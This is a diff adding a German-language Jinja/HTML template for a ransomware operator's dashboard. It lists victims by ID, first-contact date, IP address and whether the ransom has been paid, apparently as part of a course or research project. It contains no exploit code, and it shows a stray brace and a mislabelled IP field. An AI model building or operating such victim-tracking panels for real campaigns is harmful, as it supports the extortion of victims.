@@ -1,0 +1,22 @@
+{% extends "layout.html" %}
+{% block content %}
+<h2 class="text-center">Übersicht Ransomware Opfer</h2>
+<hr>
+
+<div class="row m-2">
+    {% for victim in victims %}
+    <div class="card col-sm-4">
+        <div class="card-body mx-auto text-center">
+            <h5 class="card-title"><b>Opfer {{victim.victim_id}}</b></h5>
+            <hr>
+            <p class="card-text">
+            <h6><b>Erstkontakt:</b> {{victim.date_firstContact}}}</h6>
+            <h6><b>Letzte IP:</b> {{victim.ip_firstContact}}</h6>
+            <h6><b>Zahlung erfolgt:</b> {{victim.payment_received}}</h6>
+            <hr>
+        </div>
+    </div>
+    {% endfor %}
+</div>
+
+{% endblock content %}
